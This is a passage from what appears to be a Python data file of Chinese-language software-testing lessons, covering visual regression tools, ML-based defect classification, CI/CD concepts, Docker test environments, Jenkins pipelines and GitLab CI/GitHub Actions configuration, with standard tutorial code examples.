eyes.check_window("Login Page")  # 拍快照并对比

eyes.close()
driver.quit()
'''

### 2. Percy（BrowserStack旗下）

与CI/CD深度集成的视觉测试平台。

'''yaml
# Percy 在GitHub Actions中的集成
- name: Percy Test
  uses: percy/exec-action@v0.3.1
  with:
    command: "npx percy exec -- pytest tests/"
  env:
    PERCY_TOKEN: ${{ secrets.PERCY_TOKEN }}
'''

### 3. BackstopJS

开源免费的视觉回归测试工具，适合中小型项目。

'''bash
# BackstopJS 基本使用
npm install -g backstopjs
backstopjs init                       # 初始化配置
backstopjs reference                  # 采集基准截图
backstopjs test                       # 执行测试对比
backstopjs approve                    # 批准差异并更新基准
'''

'''json
// backstop.json 配置示例
{
  "scenarios": [
    {
      "label": "首页",
      "url": "https://myapp.com/",
      "referenceUrl": "",
      "selectors": ["document"],
      "misMatchThreshold": 0.1,
      "requireSameDimensions": true
    },
    {
      "label": "登录页",
      "url": "https://myapp.com/login",
      "selectors": ["#login-form"],
      "misMatchThreshold": 0.05
    }
  ]
}
'''

### 工具对比

| 工具 | 类型 | AI能力 | CI/CD集成 | 价格 |
|------|------|--------|-----------|------|
| Applitools | 商业 | ⭐⭐⭐⭐⭐ | 完善 | 较高 |
| Percy | 商业 | ⭐⭐⭐ | 完善 | 中等 |
| BackstopJS | 开源 | ⭐ | 需要配置 | 免费 |
| Chromatic | 商业 | ⭐⭐⭐ | 完善 | 免费额度 |

## AI驱动的元素定位

传统UI自动化最大的痛点是元素定位不稳定，页面一改就挂。AI通过多维度特征匹配解决这个问题。

### 传统定位 vs AI定位

**传统定位**（单维度）：
'''python
# 依赖单一属性，页面改了id就挂
driver.find_element(By.ID, "login-btn")
driver.find_element(By.XPATH, "//button[@class='primary']")
'''

**AI定位**（多维度）：
'''
AI分析每个候选元素的多维特征：
- 视觉特征：尺寸、位置、颜色、形状
- 文本特征：标签文本、附近文本
- 结构特征：DOM父子关系、CSS类名模式
- 语义特征：ARIA角色、语义标签

即使某个维度变化，其他维度仍能匹配！
'''

### 支持AI定位的工具

- **Testim**：机器学习驱动的测试自动化平台
- **Mabl**：低代码+AI的测试自动化
- **Functionize**：NLP驱动的测试创建

## 视觉测试最佳实践

1. **选择合适的对比区域**：不要每次都对比全页面，分区域对比（header、content、footer）
2. **处理动态内容**：日期、广告、推荐列表等动态内容要排除或mock
3. **控制对比灵敏度**：根据场景调整阈值（关键页面要严格，内容页面可宽松）
4. **与组件开发结合**：在Storybook/Chromatic中进行组件级视觉测试
5. **纳入CI/CD流程**：每次PR的UI变更都应该触发视觉测试

## 本节小结

视觉AI测试解决了传统UI测试的两个核心痛点：**"像素级对比噪声太多"和"元素定位不稳定"**。推荐入门工具：先用BackstopJS了解基本流程，再根据团队预算评估Applitools或Percy。"""
    },
    {
        "title": "第4节：智能缺陷分析与预测",
        "sort_order": 4,
        "knowledge_point": "智能缺陷分析",
        "time_estimate": 25,
        "content": """## 缺陷自动分类

在大型项目中，每天可能产生数十甚至数百个缺陷，手动分类耗时且不一致。AI可以通过NLP技术自动对缺陷进行分类。

### 自动分类的维度

| 分类维度 | 示例类别 |
|----------|----------|
| 严重程度 | Critical / Major / Minor / Trivial |
| 缺陷类型 | 功能缺陷 / 性能缺陷 / UI缺陷 / 安全缺陷 |
| 根因分类 | 代码逻辑 / 数据问题 / 配置问题 / 第三方依赖 |
| 影响模块 | 用户模块 / 订单模块 / 支付模块 |

### 分类原理

'''python
# 概念示例：基于文本分类的缺陷自动分类
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.naive_bayes import MultinomialNB

# 训练数据：历史缺陷的标题+描述+人工分类标签
training_bugs = [
    ("页面点击无响应", "功能缺陷"),
    ("查询结果返回空", "功能缺陷"),
    ("页面加载超过10秒", "性能缺陷"),
    ("内存使用持续增长", "性能缺陷"),
    ("按钮颜色不一致", "UI缺陷"),
    ("文字重叠显示", "UI缺陷"),
]

texts = [bug[0] for bug in training_bugs]
labels = [bug[1] for bug in training_bugs]

vectorizer = TfidfVectorizer()
X = vectorizer.fit_transform(texts)
classifier = MultinomialNB()
classifier.fit(X, labels)

# 对新缺陷进行分类
new_bug = "用户列表滚动时卡顿"
X_new = vectorizer.transform([new_bug])
prediction = classifier.predict(X_new)[0]
print(f"预测分类: {prediction}")  # 性能缺陷
'''

## 重复缺陷检测

测试人员经常会提交已被报告过的缺陷，造成重复劳动。AI通过**文本相似度计算**来检测重复缺陷。

### 检测方法

**1. TF-IDF + 余弦相似度**：传统且有效的方法
**2. Word2Vec/BERT嵌入**：捕捉语义相似性（不同措辞但同一问题）
**3. 截图+文本多模态**：结合缺陷截图和描述文本

### 实际效果

'''python
# 概念示例：基于文本相似度的重复缺陷检测
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.metrics.pairwise import cosine_similarity

existing_bugs = [
    "登录页面的登录按钮点击后没有反应",
    "用户修改密码后无法用新密码登录",
    "订单列表页面下拉加载更多时闪退",
]

new_bug = "点击登录按钮无响应"

# 向量化并计算相似度
all_texts = existing_bugs + [new_bug]
vectorizer = TfidfVectorizer()
tfidf_matrix = vectorizer.fit_transform(all_texts)

# 新缺陷与每个已有缺陷的相似度
for i, existing in enumerate(existing_bugs):
    sim = cosine_similarity(tfidf_matrix[i], tfidf_matrix[-1])[0][0]
    if sim > 0.5:  # 相似度阈值
        print(f"可能是重复缺陷 #{i+1}: {existing} (相似度: {sim:.2f})")
'''

## 缺陷根因分析

当多个缺陷可能是同一根因导致时，AI能帮助聚类和识别：

### 聚类分析

传统上测试人员需要手动判断哪些缺陷是同一问题导致的。AI可以通过以下方式聚类：

1. **调用栈聚类**：通过崩溃日志的调用栈相似性
2. **模块共现分析**：同一模块/文件中频繁出现缺陷
3. **时间关联**：某个代码提交后集中出现的缺陷

### 根因推荐

缺陷聚类后，系统推荐可能的共同根因：

'''
聚类A（5个缺陷）：
- 用户列表分页不生效
- 搜索结果分页不生效  
- 订单列表分页不生效
→ 推荐根因：公共分页组件存在Bug
'''

## 基于机器学习的缺陷预测

### 预测目标

AI缺陷预测模型可以在代码提交时就预警："这个提交有很大概率引入新Bug！"

### 预测特征

模型学习的特征包括：

| 特征类型 | 具体特征 |
|----------|----------|
| 代码特征 | 代码行数、修改文件数、圈复杂度 |
| 历史特征 | 开发者历史Bug率、文件的Bug密度 |
| 过程特征 | 审查人数、审查评论数、是否紧急修复 |
| 时间特征 | 提交时间（是否临近发布）、距离上次提交时间 |

### 预测应用

1. **代码审查优先级**：高风险提交标记为重点审查
2. **测试资源分配**：预测有问题区域优先投入测试
3. **发布风险评分**：综合评估发布的整体风险

### 工具和框架

- **Google的Bug预测**：基于机器学习的热点分析
- **Microsoft的缺陷预测模型**：TFS/VSTS集成
- **Facebook的SapFix**：AI自动生成修复补丁（研究阶段）
- **DeepDebug**：使用深度学习定位缺陷位置

## 实施建议

在团队中引入AI缺陷分析时：

1. **从简单开始**：先做缺陷自动分类，效果立即可见
2. **积累数据**：AI效果依赖历史数据的数量和质量
3. **人机协作**：AI提供推荐，人工做最终决策
4. **持续迭代**：定期用新数据更新模型

## 本节小结

智能缺陷分析的价值链：**分类→去重→聚类→根因分析→预测**。从自动化处理重复劳动开始，逐步向预测性分析发展。关键是数据积累——缺陷管理系统中的历史数据是最宝贵的模型训练资产。"""
    },
]

# ============================================================
# 路径4: 测试平台开发与DevOps
# ============================================================
LESSON_CONTENT["测试平台开发与DevOps"] = [
    {
        "title": "第1节：CI/CD基础",
        "sort_order": 1,
        "knowledge_point": "CI/CD概念",
        "time_estimate": 25,
        "content": """## 持续集成/持续交付/持续部署

CI/CD是现代软件工程的核心实践，对于测试工程师来说，理解CI/CD是参与DevOps的基础。

### 持续集成（CI - Continuous Integration）

持续集成的核心是**频繁将代码合并到主干并自动验证**。

**CI的工作流程**：
'''
开发者提交代码 → 触发自动构建 → 编译检查 → 代码扫描（Lint） → 
单元测试 → 集成测试 → 报告结果
'''

**CI的关键原则**：
1. **频繁提交**：至少每天一次，避免大量代码积压
2. **自动验证**：每次提交自动运行构建和测试
3. **快速反馈**：10分钟内给出结果（否则开发者已切换上下文）
4. **修复优先**：构建失败是最高优先级，立即修复

**CI的好处**：
- 集成问题尽早暴露（而非最后集成时才发现大量冲突）
- 自动化回归测试每次执行
- 代码质量有持续保障

### 持续交付（CD - Continuous Delivery）

持续交付在CI的基础上，确保代码**随时处于可发布状态**。

**持续交付的额外步骤**：
'''
CI通过 → 部署到类生产环境（Staging）→ 自动化验收测试 →
手动审批 → 发布到生产
'''

持续交付和持续集成的关键区别：**持续交付多了"部署到生产"这一步**，但发布按钮仍由人工控制。

### 持续部署（Continuous Deployment）

持续部署是持续交付的终极形态：**一旦代码通过所有测试，自动发布到生产环境**。

'''CI → CD(Delivery) → CD(Deployment) 的进化：
持续集成       → 代码合并 + 自动测试
持续交付       → 代码随时可发布（但按钮由人按）
持续部署       → 代码自动发布（无人工干预）
'''

**适用场景**：
- 持续部署适合：互联网SaaS产品、内部工具
- 持续交付适合：金融系统、医疗设备等需人工审核的场景

## CI/CD Pipeline

一个完整的CI/CD Pipeline包含多个Stage（阶段）：

'''yaml
# 典型的CI/CD Pipeline结构
stages:
  - build          # 构建阶段
  - test           # 测试阶段
  - security       # 安全扫描
  - deploy_staging # 部署到测试环境
  - e2e_test       # E2E测试
  - deploy_prod    # 部署到生产环境
'''

**每个阶段包含多个Job（任务）**，可以并行执行以缩短时间。

## CI/CD中的测试策略

在CI/CD Pipeline中，测试不是一次性的，而是**分层分批执行**：

### 测试分层策略

| Pipeline阶段 | 测试类型 | 执行时间要求 | 失败处理 |
|-------------|----------|-------------|---------|
| 提交时（Commit） | Lint + 单元测试 | <5分钟 | 阻止合并 |
| PR阶段 | 单元测试 + 覆盖率 | <10分钟 | 阻止合并 |
| 合并后（Merge） | 集成测试 + API测试 | <30分钟 | 通知团队 |
| 每日构建 | 全部测试 + E2E | 数小时 | 通知团队 |
| 预发布 | 性能测试 + 安全扫描 | 数小时 | 阻止发布 |

### 快速失败原则

把执行最快的测试放在前面：

'''
编译（最快） → Lint → 单元测试 → API测试 → UI测试 → E2E测试（最慢）
'''

前面的测试失败则立即中止Pipeline，不浪费资源执行后续测试。

## "测试左移"与"测试右移"

### 测试左移（Shift-Left Testing）

将测试活动**提前**到开发过程的最早期：

- 需求阶段就参与测试分析
- 开发阶段编写单元测试
- PR阶段进行代码审查和静态分析
- 开发和测试同步进行

**目标**：缺陷发现越早，修复成本越低。

### 测试右移（Shift-Right Testing）

将测试活动**延伸到生产环境**：

- **A/B测试**：新旧版本对比
- **金丝雀发布（Canary Release）**：先给一小部分用户用新版本
- **蓝绿部署（Blue-Green Deployment）**：两套环境快速切换
- **混沌工程（Chaos Engineering）**：在生产环境注入故障来验证韧性
- **生产监控与告警**：实时监控线上质量指标

**目标**：在生产环境中持续验证质量。

### 左移和右移的关系

'''
    左移 ←--------------→ 右移
需求 → 开发 → 测试 → 预发布 → 生产
 ↑                      ↑
早期预防              持续监控
'''

两者互补而非对立：左移减少缺陷产生，右移快速发现生产问题。

## CI/CD工具生态

| 工具 | 类型 | 特点 |
|------|------|------|
| Jenkins | CI/CD服务器 | 最灵活，插件生态最丰富 |
| GitLab CI | 集成CI/CD | 与GitLab深度集成，配置简洁 |
| GitHub Actions | 集成CI/CD | 与GitHub深度集成，社区Action丰富 |
| CircleCI | 云CI/CD | 配置简单，性能好 |
| Travis CI | 云CI/CD | 开源项目友好 |
| ArgoCD | GitOps CD | Kubernetes原生持续部署 |

## 本节小结

CI/CD是DevOps的心脏。对测试工程师来说，关键是理解**如何在Pipeline中合理地安排测试阶段**——快速测试在前、慢速测试在后、阻塞发布的关键测试必须100%通过。接下来将深入Docker、Jenkins和GitLab CI的实战内容。"""
    },
    {
        "title": "第2节：Docker基础与测试环境管理",
        "sort_order": 2,
        "knowledge_point": "Docker与测试环境",
        "time_estimate": 30,
        "content": """## Docker核心概念

Docker是容器化技术的代名词，它让应用及其依赖打包在一个轻量级的容器中，实现**"一次构建，处处运行"**。对于测试工程师来说，Docker解决了测试环境管理中最棘手的"环境不一致"问题。

### Docker的三大核心概念

**1. 镜像（Image）**
镜像是容器的"模板"，包含运行应用所需的代码、运行时、系统工具和库。镜像是只读的。

**2. 容器（Container）**
容器是镜像的运行实例。每个容器相互隔离，拥有自己的文件系统、网络和进程空间。

**3. 仓库（Registry）**
存放镜像的地方。Docker Hub是最常用的公共仓库，企业常用私有仓库（如Harbor）。

### Docker vs 虚拟机

| 维度 | Docker容器 | 虚拟机 |
|------|-----------|--------|
| 启动速度 | 秒级 | 分钟级 |
| 资源占用 | MB级 | GB级 |
| 隔离级别 | 进程级 | 硬件级 |
| 数量密度 | 一台机器可运行数百个 | 一台机器可运行数十个 |
| 镜像大小 | 几十MB到几百MB | 几十GB |

## Dockerfile编写

Dockerfile是构建镜像的"配方"文件。

### 基本指令

'''dockerfile
# 基础镜像
FROM python:3.10-slim

# 设置工作目录
WORKDIR /app

# 复制依赖文件并安装
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

# 复制应用代码
COPY . .

# 暴露端口
EXPOSE 5000

# 环境变量
ENV FLASK_ENV=production

# 启动命令
CMD ["python", "app.py"]
'''

### 测试环境Dockerfile示例

'''dockerfile
FROM python:3.10-slim

WORKDIR /tests

# 安装测试依赖
COPY test-requirements.txt .
RUN pip install --no-cache-dir -r test-requirements.txt

# 安装浏览器驱动（用于UI测试）
RUN apt-get update && apt-get install -y \\
    wget \\
    unzip \\
    chromium \\
    chromium-driver \\
    && rm -rf /var/lib/apt/lists/*

# 设置浏览器驱动路径
ENV CHROME_BIN=/usr/bin/chromium
ENV CHROMEDRIVER_PATH=/usr/bin/chromedriver

# 复制测试代码
COPY tests/ .

# 默认运行pytest
CMD ["pytest", "-v", "--tb=short"]
'''

### Dockerfile最佳实践

1. **使用小体积基础镜像**：`python:3.10-slim` 比 `python:3.10` 小很多
2. **层合并**：多个RUN指令合并为一个，减少镜像层数
3. **利用缓存**：先复制依赖文件再复制代码，代码变更时不重新安装依赖
4. **.dockerignore**：排除不需要的文件（`node_modules`、`.git`等）
5. **不存储敏感信息**：密码、密钥等通过环境变量或Secrets传入

## docker-compose编排测试环境

docker-compose可以一键启动由多个容器组成的完整测试环境。

'''yaml
# docker-compose.yml - 测试环境编排
version: '3.8'

services:
  # 数据库
  postgres:
    image: postgres:15-alpine
    environment:
      POSTGRES_DB: testdb
      POSTGRES_USER: tester
      POSTGRES_PASSWORD: test_pass
    ports:
      - "5432:5432"
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U tester"]
      interval: 5s
      timeout: 5s
      retries: 5

  # Redis缓存
  redis:
    image: redis:7-alpine
    ports:
      - "6379:6379"
    healthcheck:
      test: ["CMD", "redis-cli", "ping"]
      interval: 5s
      timeout: 3s
      retries: 5

  # API服务
  api:
    build:
      context: .
      dockerfile: Dockerfile
    ports:
      - "5000:5000"
    environment:
      DATABASE_URL: postgresql://tester:test_pass@postgres:5432/testdb
      REDIS_URL: redis://redis:6379/0
    depends_on:
      postgres:
        condition: service_healthy
      redis:
        condition: service_healthy

  # 测试运行器
  tests:
    build:
      context: .
      dockerfile: Dockerfile.test
    environment:
      API_BASE_URL: http://api:5000
    depends_on:
      - api
    command: pytest -v --junitxml=results/junit.xml
    volumes:
      - ./results:/app/results
'''

使用这些命令即可启动完整环境并执行测试：

'''bash
# 启动环境并运行测试
docker-compose up --build --abort-on-container-exit

# 只启动环境（不运行测试）
docker-compose up -d api postgres redis

# 关闭环境
docker-compose down -v
'''

## Selenium Grid容器化

Selenium Grid允许在多个机器上并行执行UI测试，Docker化部署非常方便。

'''yaml
# Selenium Grid 4 使用docker-compose
version: '3.8'

services:
  selenium-hub:
    image: selenium/hub:4.15
    ports:
      - "4442:4442"
      - "4443:4443"
      - "4444:4444"

  chrome-node:
    image: selenium/node-chrome:4.15
    depends_on:
      - selenium-hub
    environment:
      - SE_EVENT_BUS_HOST=selenium-hub
      - SE_EVENT_BUS_PUBLISH_PORT=4442
      - SE_EVENT_BUS_SUBSCRIBE_PORT=4443
      - SE_NODE_MAX_SESSIONS=5
    volumes:
      - /dev/shm:/dev/shm

  firefox-node:
    image: selenium/node-firefox:4.15
    depends_on:
      - selenium-hub
    environment:
      - SE_EVENT_BUS_HOST=selenium-hub
      - SE_EVENT_BUS_PUBLISH_PORT=4442
      - SE_EVENT_BUS_SUBSCRIBE_PORT=4443
      - SE_NODE_MAX_SESSIONS=3
    volumes:
      - /dev/shm:/dev/shm
'''

'''python
# 连接Selenium Grid进行测试
from selenium import webdriver
from selenium.webdriver.common.by import By

options = webdriver.ChromeOptions()
options.add_argument('--headless')
options.add_argument('--no-sandbox')

# 连接到Grid Hub
driver = webdriver.Remote(
    command_executor='http://localhost:4444/wd/hub',
    options=options
)

driver.get('https://myapp.com/login')
assert '登录' in driver.title
driver.quit()
'''

## Docker在测试中的典型应用场景

| 场景 | Docker解决方案 |
|------|---------------|
| 环境一致性 | 所有测试人员使用同一镜像 |
| 环境快速重置 | 容器销毁重建即可恢复干净环境 |
| 并行测试 | 多容器并行执行不同测试套件 |
| 数据库测试 | 容器化数据库，测试完即销毁 |
| 依赖服务Mock | 用容器运行WireMock等Mock服务 |
| 多版本测试 | 不同数据库/中间件版本运行同一测试 |

## 常用Docker命令速查

'''bash
# 镜像相关
docker pull image:tag          # 拉取镜像
docker build -t name:tag .     # 构建镜像
docker images                  # 查看本地镜像
docker rmi image_id            # 删除镜像

# 容器相关
docker run -d -p 8080:80 --name myapp image:tag  # 运行容器
docker ps                      # 查看运行中的容器
docker ps -a                   # 查看所有容器
docker logs container_name     # 查看日志
docker exec -it container bash # 进入容器
docker stop container          # 停止容器
docker rm container            # 删除容器

# Compose相关
docker-compose up -d           # 后台启动
docker-compose down            # 停止并删除
docker-compose ps              # 查看服务状态
docker-compose logs -f         # 跟踪日志

# 清理
docker system prune -a         # 清理所有未使用的资源
'''

## 本节小结

Docker是测试环境管理的革命性工具。核心能力：**镜像保证一致性、Compose编排多服务环境、容器化执行并行测试**。掌握Docker是测试工程师迈向DevOps的关键一步。"""
    },
    {
        "title": "第3节：Jenkins Pipeline实战",
        "sort_order": 3,
        "knowledge_point": "Jenkins Pipeline",
        "time_estimate": 30,
        "content": """## Jenkins基础

Jenkins是最流行的开源CI/CD服务器，拥有超过1800个插件，几乎可以集成任何工具。其核心优势是**灵活性和可定制性**。

### Jenkins的核心概念

| 概念 | 说明 |
|------|------|
| Job/Item | 一个CI/CD任务（可以是Pipeline、Freestyle等） |
| Node | 执行Job的机器（Master/Agent） |
| Workspace | Job的工作目录 |
| Build | Job的一次执行 |
| Plugin | Jenkins的功能扩展 |
| Pipeline | 用代码定义的CI/CD流程（Pipeline as Code） |

### 安装方式

'''bash
# Docker方式运行（推荐用于学习和测试）
docker run -d --name jenkins \\
  -p 8080:8080 -p 50000:50000 \\
  -v jenkins_home:/var/jenkins_home \\
  jenkins/jenkins:lts

# 查看初始密码
docker exec jenkins cat /var/jenkins_home/secrets/initialAdminPassword
'''

## Declarative Pipeline 语法

Jenkins Pipeline有两种定义方式：Declarative（声明式）和Scripted（脚本式）。Declarative Pipeline更结构化、更易读，是推荐的方式。

### 基本结构

'''groovy
pipeline {
    agent any                          // 在任何可用节点上执行
    
    environment {                      // 环境变量
        APP_NAME = 'my-app'
        DOCKER_IMAGE = 'my-app:latest'
    }
    
    stages {
        stage('Checkout') {            // 阶段1：拉取代码
            steps {
                checkout scm           // 从SCM（Git等）拉取
            }
        }
        
        stage('Build') {               // 阶段2：构建
            steps {
                sh 'mvn clean package'
            }
        }
        
        stage('Test') {                // 阶段3：测试
            parallel {                 // 并行执行
                stage('Unit Tests') {
                    steps {
                        sh 'mvn test'
                    }
                    post {
                        always {
                            junit 'target/surefire-reports/*.xml'
                        }
                    }
                }
                stage('Lint') {
                    steps {
                        sh 'npm run lint'
                    }
                }
            }
        }
        
        stage('Deploy') {              // 阶段4：部署
            steps {
                sh 'docker build -t ${DOCKER_IMAGE} .'
                sh 'docker-compose up -d'
            }
        }
    }
    
    post {                             // Pipeline完成后
        success {
            echo 'Pipeline 成功!'
        }
        failure {
            echo 'Pipeline 失败，发送通知...'
            // 发送邮件/钉钉/企微通知
        }
        always {
            cleanWs()                  // 清理工作空间
        }
    }
}
'''

### 核心指令说明

**agent**：指定在哪执行
- `agent any`：任意可用节点
- `agent { label 'linux-docker' }`：指定标签的节点
- `agent { docker { image 'node:16' } }`：在Docker容器中执行
- `agent none`：不在顶层指定，在各个stage分别指定

**stage**：逻辑阶段
- Pipeline的结构单元，一个Pipeline至少有一个stage
- 所有stage在串行（按顺序）执行（除非用parallel）

**steps**：具体执行步骤
- `sh`：执行Shell命令
- `echo`：输出日志
- `junit`：收集测试报告
- `checkout scm`：拉取代码

## 集成测试任务的Pipeline示例

### API测试Pipeline

'''groovy
pipeline {
    agent { label 'test-runner' }
    
    parameters {
        choice(name: 'ENV', choices: ['dev', 'staging', 'prod'], description: '测试环境')
        string(name: 'TEST_MARKER', defaultValue: 'smoke', description: 'pytest marker')
    }
    
    environment {
        TEST_ENV = "${params.ENV}"
    }
    
    stages {
        stage('Setup Environment') {
            steps {
                script {
                    def envConfig = readJSON file: "config/${TEST_ENV}.json"
                    env.API_URL = envConfig.api_url
                    env.DB_URL = envConfig.db_url
                }
                echo "环境: ${TEST_ENV}, API: ${API_URL}"
            }
        }
        
        stage('Run Tests') {
            steps {
                sh '''
                    pip install -r requirements-test.txt
                    pytest tests/api/ \\
                        -v \\
                        -m "${TEST_MARKER}" \\
                        --junitxml=reports/junit.xml \\
                        --html=reports/report.html \\
                        --self-contained-html
                '''
            }
        }
    }
    
    post {
        always {
            // 归档测试报告
            archiveArtifacts artifacts: 'reports/**', allowEmptyArchive: true
            // 发布JUnit报告
            junit 'reports/junit.xml'
            // 发布HTML报告
            publishHTML(target: [
                allowMissing: false,
                alwaysLinkToLastBuild: true,
                keepAll: true,
                reportDir: 'reports',
                reportFiles: 'report.html',
                reportName: 'API Test Report'
            ])
        }
        failure {
            emailext(
                subject: "[BUILD FAILED] ${env.JOB_NAME} - ${env.BUILD_NUMBER}",
                body: "API测试失败! \n日志: ${env.BUILD_URL}console",
                to: 'test-team@company.com'
            )
        }
    }
}
'''

## 触发方式

Jenkins Pipeline可以通过多种方式触发：

| 触发方式 | 配置示例 | 适用场景 |
|----------|----------|----------|
| 定时触发 | `cron('H 2 * * *')` | 每日构建/夜间回归 |
| 代码提交（Webhook） | GitHub/GitLab Push Event | CI持续集成 |
| 上游Job触发 | Pipeline间依赖 | 复杂的工作流 |
| 手动触发 | Build Now按钮 | 按需执行 |

### Pipeline中的触发器配置

'''groovy
pipeline {
    agent any
    
    triggers {
        // 定时：每天凌晨2点
        cron('H 2 * * *')
        // 每5分钟检查一次代码变更
        pollSCM('H/5 * * * *')
    }
    
    stages {
        // ...
    }
}
'''

### Webhook配置

'''bash
# GitHub Webhook
1. GitHub Repo → Settings → Webhooks
2. Payload URL: http://jenkins-server/github-webhook/
3. Content type: application/json
4. Events: Push events
'''

## Jenkins Pipeline 最佳实践

1. **Pipeline as Code**：Jenkinsfile放入代码仓库，版本化管理
2. **保持Stage简短**：每个Stage应在10分钟内完成
3. **早点失败**：快的测试在前（Lint → 单元测试 → 集成测试）
4. **使用并行**：独立的任务放在parallel中
5. **清理Workspace**：post { always { cleanWs() } }
6. **参数化配置**：用parameters定义环境、范围等变量
7. **环境变量管理**：敏感信息用Credentials插件而非硬编码

## 本节小结

Jenkins Pipeline的核心价值是"Pipeline as Code"——将CI/CD流程以代码形式定义在Jenkinsfile中，纳入版本控制。Declarative Pipeline语法清晰易读，推荐使用。掌握Stage、Step、Agent、Post等核心概念即可构建实用的测试Pipeline。"""
    },
    {
        "title": "第4节：GitLab CI与GitHub Actions",
        "sort_order": 4,
        "knowledge_point": "GitLab CI & GitHub Actions",
        "time_estimate": 25,
        "content": """## GitLab CI配置

GitLab CI是GitLab内置的CI/CD功能，通过`.gitlab-ci.yml`文件定义Pipeline。它的最大优势是与GitLab深度集成，开箱即用。

### 基本结构

'''yaml
# .gitlab-ci.yml
stages:
  - build
  - test
  - deploy

variables:
  DOCKER_IMAGE: registry.gitlab.com/mygroup/myapp

before_script:
  - docker login -u $CI_REGISTRY_USER -p $CI_REGISTRY_PASSWORD $CI_REGISTRY

build_job:
  stage: build
  script:
    - docker build -t $DOCKER_IMAGE:$CI_COMMIT_SHA .
    - docker push $DOCKER_IMAGE:$CI_COMMIT_SHA
  only:
    - main
    - merge_requests

unit_test:
  stage: test
  image: python:3.10
  before_script:
    - pip install -r requirements-test.txt
  script:
    - pytest tests/unit/ --junitxml=report.xml
  artifacts:
    when: always
    reports:
      junit: report.xml

api_test:
  stage: test
  image: python:3.10
  services:
    - postgres:15
  variables:
    POSTGRES_DB: testdb
    POSTGRES_USER: tester
    POSTGRES_PASSWORD: test_pass
    DATABASE_URL: postgresql://tester:test_pass@postgres:5432/testdb
  before_script:
    - pip install -r requirements-test.txt
    - python manage.py migrate
  script:
    - pytest tests/api/ -v

deploy_staging:
  stage: deploy
  script:
    - kubectl set image deployment/myapp myapp=$DOCKER_IMAGE:$CI_COMMIT_SHA
  environment:
    name: staging
  only:
    - main
'''

### GitLab CI关键特性

**1. Auto DevOps**：自动生成CI/CD Pipeline，适合标准项目
**2. Environment**：管理部署环境，追踪每次部署
**3. Review Apps**：为每个MR自动部署临时环境
**4. Container Registry**：内置Docker镜像仓库
**5. GitLab Runner**：执行Job的Agent，支持多种Executor

### 预定义变量

| 变量 | 说明 |
|------|------|
| `CI_COMMIT_SHA` | 当前提交的完整SHA |
| `CI_COMMIT_BRANCH` | 当前分支名 |
| `CI_PIPELINE_ID` | Pipeline ID |
| `CI_JOB_ID` | Job ID |
| `CI_REGISTRY_IMAGE` | 项目容器镜像地址 |

## GitHub Actions

GitHub Actions是GitHub的CI/CD服务，通过仓库中的`.github/workflows/*.yml`文件定义。

### 基本结构

'''yaml
# .github/workflows/test.yml
name: Test Suite

on:
  push:
    branches: [ main, develop ]
  pull_request:
    branches: [ main ]
  schedule:
    - cron: '0 2 * * *'  # 每日凌晨2点

jobs:
  unit-tests:
    runs-on: ubuntu-latest
    
    strategy:
      matrix:
        python-version: ['3.9', '3.10', '3.11']
    
    steps:
      - uses: actions/checkout@v4
      
      - name: Set up Python ${{ matrix.python-version }}
        uses: actions/setup-python@v5
        with:
          python-version: ${{ matrix.python-version }}
      
      - name: Install dependencies
        run: |
          python -m pip install --upgrade pip
          pip install -r requirements-test.txt
      
      - name: Run unit tests
        run: pytest tests/unit/ --junitxml=results/junit.xml
      
      - name: Upload test results
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: test-results-${{ matrix.python-version }}
          path: results/

  api-tests:
    needs: unit-tests
    runs-on: ubuntu-latest
    
    services:
      postgres:
        image: postgres:15
        env:
          POSTGRES_DB: testdb
          POSTGRES_USER: tester
          POSTGRES_PASSWORD: test_pass
        ports:
          - 5432:5432
        options: >-
          --health-cmd pg_isready
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5
      
      redis:
        image: redis:7
        ports:
          - 6379:6379
        options: >-
          --health-cmd "redis-cli ping"
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5
    
    steps:
      - uses: actions/checkout@v4
      
      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.11'
      
      - name: Install dependencies
        run: pip install -r requirements-test.txt
      
      - name: Run API tests
        env:
          DATABASE_URL: postgresql://tester:test_pass@localhost:5432/testdb
          REDIS_URL: redis://localhost:6379/0
        run: pytest tests/api/ -v --junitxml=results/api-junit.xml

  deploy:
    needs: [unit-tests, api-tests]
    if: github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Deploy to production
        run: |
          echo "Deploying..."
        # 实际部署命令
'''

### GitHub Actions关键概念

| 概念 | 说明 |
|------|------|
| Workflow | 一个`.yml`文件定义的CI/CD流程 |
| Job | Workflow中的一个作业（多个Job默认并行） |
| Step | Job中的一个步骤（可以执行命令或使用Action） |
| Action | 可复用的步骤（官方/社区市场） |
| Runner | 执行Job的服务器 |
| Matrix | 多版本/多环境并行测试 |

### 常用社区Action

'''yaml
# 代码检出
- uses: actions/checkout@v4

# 设置Python
- uses: actions/setup-python@v5
  with:
    python-version: '3.11'

# 设置Node.js
- uses: actions/setup-node@v4
  with:
    node-version: '20'

# 缓存依赖
- uses: actions/cache@v4
  with:
    path: ~/.cache/pip
    key: ${{ runner.os }}-pip-${{ hashFiles('requirements.txt') }}

# Docker Build & Push
- uses: docker/build-push-action@v5
  with:
    push: true
    tags: myapp:latest

# 上传产物
- uses: actions/upload-artifact@v4
  with:
    name: reports
    path: results/

# Slack通知
- uses: slackapi/slack-github-action@v1
  with:
    payload: '{"text": "Tests failed!"}'
  env:
    SLACK_WEBHOOK_URL: ${{ secrets.SLACK_WEBHOOK }}
'''

## 三者对比：Jenkins vs GitLab CI vs GitHub Actions

| 维度 | Jenkins | GitLab CI | GitHub Actions |
|------|---------|-----------|----------------|
| 部署方式 | 自托管 | 云/自托管 | 云/自托管 |
| 配置方式 | Jenkinsfile (Groovy) | .gitlab-ci.yml | .github/workflows/*.yml |
| 学习曲线 | 较陡 | 中等 | 较平缓 |
| 插件/生态 | 1800+插件 | 与GitLab深度集成 | 社区Action丰富 |
| 灵活性 | 最高（几乎可做任何事） | 中等 | 中等 |
| 适合场景 | 复杂/定制化需求 | GitLab用户 | GitHub用户 |
| 免费额度 | 自托管免费 | 每月400分钟 | 每月2000分钟（公开仓库免费） |

## 多环境自动部署

'''yaml
# 基于分支的多环境部署策略
deploy_dev:
  stage: deploy
  script:
